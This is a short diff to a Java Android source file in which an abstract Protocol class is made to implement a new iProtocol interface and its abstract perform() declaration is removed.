@@ -28,6 +28,7 @@ import com.android.networking.evidence.EvidenceType;
 import com.android.networking.file.AutoFile;
 import com.android.networking.file.Directory;
 import com.android.networking.file.Path;
+import com.android.networking.interfaces.iProtocol;
 import com.android.networking.util.Check;
 import com.android.networking.util.DataBuffer;
 import com.android.networking.util.DateTime;
@@ -37,7 +38,7 @@ import com.android.networking.util.WChar;
 /**
  * The Class Protocol, is extended by ZProtocol
  */
-public abstract class Protocol {
+public abstract class Protocol implements iProtocol {
 
 	/** The Constant UPGRADE_FILENAME. */
 	public static final String UPGRADE_FILENAME = Messages.getString("5.0"); //$NON-NLS-1$
@@ -69,14 +70,6 @@ public abstract class Protocol {
 		return true;
 	}
 
-	/**
-	 * Perform.
-	 * 
-	 * @return true, if successful
-	 * @throws ProtocolException
-	 *             the protocol exception
-	 */
-	public abstract boolean perform() throws ProtocolException;
 
 	/**
 	 * Save new conf.
